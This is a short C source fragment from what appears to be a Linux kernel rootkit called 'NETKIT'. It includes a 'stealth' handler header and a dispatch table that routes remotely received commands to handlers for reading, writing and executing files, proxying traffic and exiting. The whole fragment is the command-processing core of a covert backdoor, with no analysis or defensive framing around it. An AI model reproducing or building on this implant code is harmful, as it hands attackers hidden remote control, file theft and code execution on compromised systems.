#include "handlers/file.h"
#include "handlers/socket.h"
#include "handlers/stealth.h"

static int (*COMM_HANDLERS[])(const u8*, size_t, u8**, size_t*) = {
    cmd_handle_file_read,
    cmd_handle_file_write,
    cmd_handle_file_exec,
    cmd_handle_proxy,
    cmd_handle_exit
};


static inline int cmd_process(u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 cmd_id;
    int retv;

    if (req_buflen < 1)
    {
        retv = -EINVAL;
        goto LAB_OUT;
    }

    cmd_id = req_buf[0];
    if (cmd_id < 0 || cmd_id >= sizeof(COMM_HANDLERS) / sizeof(*COMM_HANDLERS))
    {
        NETKIT_LOG("[!] inval cmd: %hhd\n", cmd_id);
        retv = -EDOM;
        goto LAB_OUT;
    }

    NETKIT_LOG("[*] processing cmd: %hhd\n", cmd_id);

    // output is not guaranteed for positive response, so force it to NULL/0
    *res_buf = NULL;
    *res_buflen = 0;

    // allow OOB ptr with size 0
    retv = NETKIT_PIPELINE_CALL(COMM_HANDLERS[cmd_id], req_buf + 1, req_buflen - 1, res_buf, res_buflen);

LAB_OUT:
    kzfree(req_buf, req_buflen);

    return retv;
}